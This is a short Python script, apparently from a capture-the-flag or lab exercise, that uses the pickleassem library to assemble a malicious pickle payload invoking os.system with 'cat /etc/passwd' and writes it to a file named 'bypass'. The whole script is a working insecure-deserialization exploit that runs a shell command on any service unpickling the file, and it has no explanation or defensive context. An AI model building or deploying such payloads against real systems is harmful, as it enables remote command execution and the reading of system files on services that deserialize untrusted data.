import pickle
import pickletools
import base64 

from pickleassem import PickleAssembler

pa = PickleAssembler(proto=4)
pa.push_mark()
pa.util_push('cat /etc/passwd')
pa.build_inst('os', 'system')
payload = pa.assemble()
print(payload)

with open("bypass", "wb") as f:
    f.write(payload)